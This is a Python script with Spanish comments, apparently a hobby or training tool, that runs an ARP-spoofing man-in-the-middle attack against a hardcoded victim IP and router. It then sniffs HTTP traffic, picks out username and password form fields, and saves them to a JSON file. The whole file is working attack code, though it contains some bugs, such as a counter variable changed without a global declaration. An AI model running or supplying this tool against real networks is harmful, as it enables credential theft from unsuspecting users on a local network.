import os
import argparse
from scapy.all import *
from scapy_http import http
import json

# DEFINE LISTAS Y LAS VARIABLES A UTILIZAR
# Para el caso de la lista se utiliza los patrones que pueden ser capturados por un sniffer para poder identificar una posible contraseña

wordlist = ["username", "user", "userid", "usuario", "password", "pas"]
listaFinal = []
contador = 0

#DEFINE UNA FUNCION QUE CAPTURA EL TRAFICO HTTP

def capture_http(pkt):
    if pkt.haslayer(http.HTTPRequest): #Evalua si existe una solicitud de paquete http
        print(("VICTIMA: " + pkt[IP].src #Muestra la direccion Ip de origen del paquete
               + " DESTINO: " + pkt[IP].dst #Muestra la direccion Ip destino del paquete
               + " DOMINIO: " + str(pkt[http.HTTPRequest].Host))) #
        if pkt.haslayer(Raw):
            try:
                data = (pkt[Raw]
                        .load
                        .lower()
                        .decode('utf-8'))
            except:
                return None  
            
            for word in wordlist:
                if word in data:
                    dataFormat = data.split("&")
                    userandpassword= dataFormat[:2]
                    listaFinal.extend(userandpassword)
                    print ("POSIBLE USUARIO Y PASSWORD: ", listaFinal)
            
        crearArchivo(listaFinal)

def crearArchivo(listaFinal):
    if listaFinal != []:
        if (len(listaFinal) >= 1) and (contador < len(listaFinal)):
            with open('captura_paquetesKey.json', 'a') as archivo_paquetes:
                json.dump(listaFinal, archivo_paquetes, indent=4)
                archivo_paquetes. close ()
                print ("****** Los paquetes fueron guardados en el archivo JSON <captura_paquetesKey.json> correctamente *******")
                contador += 1
# define una funcion que optiene la mac addres de una interfaz

def get_mac(ip):
    ip_layer = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff :ff:ff:ff")
    final_packet = broadcast / ip_layer
    answer = srp(final_packet, timeout=2, verbose=False)[0]
    mac = answer[0][1].hwsrc
    return mac



# DEFINE UNA FUNCION PARA EL ATAQUE MITH DE TIPO ARP


def spoofer (target, spoofed) :
    mac = get_mac (target)
    #print ("MAC:", mac)
    spoofer_mac = ARP(op=2, hwdst=mac, pdst=target, psrc=spoofed)
    send(spoofer_mac, verbose=False)



# SE DEFINE LA FUNCION PRINCIPAL    
    
def main():
    print ("====== Running Attack MITM ======")
    try:
        while True:
            spoofer("192.168.1.19", "192.168.1.254") #ipvictima e Iprouter
            spoofer("192.168.1.254", "192.168.1.19")
            print("====== Sniffing Password Active | Capturanto paquetes HTTP ======")
            sniff(iface="eth0",
            store=False,
            prn=capture_http) #iface es el nombre del grupo de red

    except KeyboardInterrupt:
        exit(0)

if __name__ == "__main__":
    main()